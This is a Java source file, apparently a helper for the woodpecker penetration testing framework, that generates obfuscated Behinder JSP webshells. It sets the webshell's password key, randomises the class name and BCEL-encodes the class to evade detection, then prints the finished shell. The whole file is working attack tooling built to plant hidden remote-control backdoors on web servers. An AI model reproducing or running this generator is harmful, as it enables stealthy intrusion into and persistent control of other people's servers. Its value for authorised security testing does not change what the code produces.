package plugins.helper.trick;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import me.gv7.woodpecker.bcel.HackBCELs;
import me.gv7.woodpecker.plugin.IArg;
import me.gv7.woodpecker.plugin.IArgsUsageBinder;
import me.gv7.woodpecker.plugin.IHelper;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.tools.misc.RandomUtil;
import util.ResourceUtil;
import util.hash.Hash;

import java.io.ByteArrayInputStream;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class BehinderWebShellGenerateHelper implements IHelper {
    @Override
    public String getHelperTabCaption() {
        return "Generate BCEL Encoded Behinder WebShell";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = TrickyJSPGeneratorPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<>();
        IArg passwordArg = TrickyJSPGeneratorPlugin.pluginHelper.createArg();
        passwordArg.setName("password");
        passwordArg.setDefaultValue("behinder");
        passwordArg.setDescription("冰蝎连接密码");
        passwordArg.setRequired(true);

        IArg compressArg = TrickyJSPGeneratorPlugin.pluginHelper.createArg();
        compressArg.setName("compress");
        compressArg.setDefaultValue("false");
        compressArg.setDescription("是否压缩(去除换行和多余的空格)");
        compressArg.setRequired(true);

        args.add(passwordArg);
        args.add(compressArg);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void doHelp(Map<String, Object> customArgs, final IResultOutput iResultOutput) throws Throwable {
        final String password = (String) customArgs.get("password");
        String webShellTemplate = new String(ResourceUtil.getResourceBytes("template/jsp/bcel_encoded_behinder.jsp"));
        byte[] behinderJDK6Bytes = ResourceUtil.getResourceBytes("template/class/BCELBehinder.class");
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass(new ByteArrayInputStream(behinderJDK6Bytes));
        CtField passwordField = ctClass.getField("k");
        ctClass.removeField(passwordField);
        passwordField = new CtField(pool.get("java.lang.String"),"k",ctClass);
        passwordField.setModifiers(Modifier.PRIVATE|Modifier.STATIC);
        String pwdMd5 = Hash.md5(password.getBytes()).toString().substring(0,16);
        ctClass.addField(passwordField, CtField.Initializer.constant(pwdMd5));
        // 随机类名
        ctClass.setName(RandomUtil.getRandomString(5));
        byte[] classBytes = ctClass.toBytecode();
        String behinderJDK6BCEL = HackBCELs.encode(classBytes);
        String webShell = webShellTemplate.replace("{BCEL}",behinderJDK6BCEL);
        if (customArgs.get("compress").equals("true")){
            webShell = webShell
                    .replace("\n","")
                    .replace("    ","");
        }
        iResultOutput.rawPrintln(webShell);
    }
}
